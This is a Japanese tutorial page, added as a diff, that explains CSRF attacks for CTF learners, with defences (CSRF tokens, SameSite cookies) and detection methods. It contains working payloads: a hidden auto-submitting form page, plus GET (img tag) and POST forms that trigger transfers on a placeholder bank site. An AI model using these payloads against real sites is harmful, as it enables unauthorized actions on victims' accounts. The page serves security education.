@@ -1,0 +1,162 @@
+---
+sidebar_position: 4
+---
+
+# CSRF（Cross-Site Request Forgery）
+
+## CSRFとは
+
+**CSRF（Cross-Site Request Forgery）** は、Webアプリケーションへの攻撃手法の一つです。認証済みのユーザーに、意図しないリクエストを送信させます。
+
+ユーザーが攻撃者の罠ページにアクセスすることで、知らないうちに危険な操作（パスワード変更、送金など）が実行されます。
+
+### 前提条件
+
+この攻撃が成立するには：
+- 被害者が認証済みである（CookieにセッションIDが含まれている）
+- CSRFトークンが設定されていない
+- SameSite属性が設定されていないCookieを使用している
+- ブラウザが自動的にCookieを付与する仕様（これが根本原因）
+
+### 攻撃成功時の例
+
+```http
+POST /transfer HTTP/1.1
+Host: bank.example.com
+Cookie: session=abc123
+
+{"to": "attacker", "amount": 1000000}
+```
+
+レスポンス: `HTTP/1.1 200 OK {"status": "Transfer completed"}`
+
+### 攻撃失敗時の例
+
+```http
+HTTP/1.1 403 Forbidden
+{"error": "Invalid CSRF token"}
+```
+
+### 成功/失敗の判定基準
+
+- **成功**: 意図しない操作が実行される（送金完了、パスワード変更完了等）
+- **失敗**: CSRFトークン検証エラー、403 Forbidden
+
+### 検出方法（防御側）
+
+- CSRFトークンの検証失敗ログ
+- 不審なRefererヘッダーの検出
+- ユーザーの操作パターン分析
+- 重要な操作前の再認証
+
+## XSSとの違い
+
+| | XSS | CSRF |
+|---|---|---|
+| 何ができるか | 任意のJavaScriptを実行 | 認証済みユーザーのリクエストを送信 |
+| 対象 | 他のユーザーのブラウザ | Webアプリケーション |
+| 主な目的 | Cookie窃取、情報窃取 | 意図しない操作の実行 |
+
+## 攻撃の仕組み
+
+### 攻撃の流れ
+
+```
+1. ユーザーが銀行サイトにログイン（CookieにセッションIDが保存される）
+2. ユーザーが攻撃者の罠ページにアクセス
+3. 罠ページが、銀行サイトへのリクエストを自動送信
+4. ブラウザは自動的にCookie（セッションID）を付与
+5. 銀行サイトは「正規ユーザーのリクエスト」と認識して処理を実行
+```
+
+### 攻撃例
+
+#### 罠ページ（攻撃者のサイト）
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>無料の景品ゲット！</h1>
+  
+  <!-- 隠しフォーム -->
+  <form id="csrf" action="https://bank.com/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker_account">
+    <input type="hidden" name="amount" value="1000000">
+  </form>
+  
+  <script>
+    // ページ読み込み時に自動送信
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
+```
+
+## CSRFの種類
+
+### 1. GETベースのCSRF
+
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=1000000" width="0" height="0">
+```
+
+### 2. POSTベースのCSRF
+
+```html
+<form action="https://bank.com/transfer" method="POST" id="csrf">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000000">
+</form>
+<script>
+  document.getElementById('csrf').submit();
+</script>
+```
+
+## 防御方法
+
+### 1. CSRFトークン
+
+```html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="random_token_12345">
+  <input type="text" name="to">
+  <input type="number" name="amount">
+</form>
+```
+
+サーバー側でトークンを検証します。攻撃者はトークンを知らないため、偽のリクエストを送信できません。
+
+### 2. SameSite Cookie
+
+```
+Set-Cookie: session=abc123; SameSite=Strict
+```
+
+クロスサイトリクエストではCookieが送信されません。
+
+## CTFでのポイント
+
+### 1. CSRFトークンの確認
+
+フォームにCSRFトークンがあるか確認します。
+
+### 2. Cookieの属性
+
+`SameSite` 属性が設定されているか確認します。
+
+### 3. 管理者の操作を模倣
+
+管理者だけが実行できる操作（flagの表示など）を、CSRFで実行させます。
+
+### 4. Botの動作
+
+CTFでは、管理者Botが罠ページにアクセスする設定になっていることがあります。
+
+## まとめ
+
+CSRFは、認証済みのユーザーに意図しない操作を実行させる攻撃手法です。
+
+CSRFトークンとSameSite Cookieの設定で防御可能です。
+
+次回は、認証・セッションの仕組みとJWTについて学びます。
